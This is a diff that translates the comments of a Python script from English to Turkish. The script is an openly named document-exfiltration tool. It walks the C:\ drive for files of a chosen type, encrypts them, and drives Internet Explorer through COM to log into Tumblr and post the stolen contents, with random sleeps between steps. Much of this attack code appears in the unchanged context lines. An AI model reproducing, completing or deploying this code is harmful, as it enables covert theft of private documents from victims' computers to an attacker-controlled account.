@@ -25,7 +25,7 @@ YLZuR2u5KUbr9uabEzgtrLyOeoK8UscKmzOvtwxZDcgNijqMJKuqpNZczPHmf9cS
 
 
 def wait_for_browser(browser):
-    # wait for the browser to finish loading a page
+    # tarayıcının bir sayfayı yüklemeyi bitirmesini bekleyin
     while browser.ReadyState != 4 and browser.ReadyState != "complete":
         time.sleep(0.1)
     return
@@ -57,7 +57,7 @@ def encrypt_string(plaintext):
 
 
 def encrypt_post(filename):
-    # open and read the file
+    # dosyayı aç ve oku
     fd = open(filename, "rb")
     contents = fd.read()
     fd.close()
@@ -74,10 +74,10 @@ def random_sleep():
 
 
 def login_to_tumblr(ie):
-    # retrieve all elements in the document
+    # belgedeki tüm öğeleri al
     full_doc = ie.Document.all
 
-    # iterate looking for the logout form
+    # çıkış formunu aramayı tekrarla
     for i in full_doc:
         if i.id == "signup_email":
             i.setAttribute("value", username)
@@ -86,7 +86,7 @@ def login_to_tumblr(ie):
 
     random_sleep()
 
-    # you can be presented with different homepages
+    # farklı ana sayfalarla oluşturulabilir
     try:
         if ie.Document.forms[0].id == "signup_form":
             ie.Document.forms[0].submit()
@@ -97,7 +97,7 @@ def login_to_tumblr(ie):
 
     random_sleep()
 
-    # the login form is the second form on the page
+    # giriş formu sayfadaki ikinci formdur
     wait_for_browser(ie)
     return
 
@@ -119,12 +119,12 @@ def post_to_tumblr(ie, title, post):
             post_form = i
             i.focus()
 
-    # move focus away from the main content box        
+    # odağı ana içerik kutusundan uzaklaştır
     random_sleep()
     title_box.focus()
     random_sleep()
 
-    # post the form
+    # formu gönder
     post_form.children[0].click()
     wait_for_browser(ie)
 
@@ -136,7 +136,7 @@ def exfiltrate(document_path):
     ie = win32com.client.Dispatch("InternetExplorer.Application")
     ie.Visible = 1
 
-    # head to tumblr and login
+    # tumblr'a gidin ve giriş yapın
     ie.Navigate("http://www.tumblr.com/login")
     wait_for_browser(ie)
 
@@ -147,21 +147,21 @@ def exfiltrate(document_path):
     ie.Navigate("https://www.tumblr.com/new/text")
     wait_for_browser(ie)
 
-    # encrypt the file
+    # dosyayı şifrele
     title, body = encrypt_post(document_path)
 
     print("Creating new post...")
     post_to_tumblr(ie, title, body)
     print("Posted!")
 
-    # Destroy the IE instance
+    # IE örneğini yok edin
     ie.Quit()
     ie = None
 
     return
 
 
-# main loop for document discovery
+# belge keşfi için ana döngü
 for parent, directories, filenames in os.walk("C:\\"):
     for filename in fnmatch.filter(filenames, "*%s" % doc_type):
         document_path = os.path.join(parent, filename)
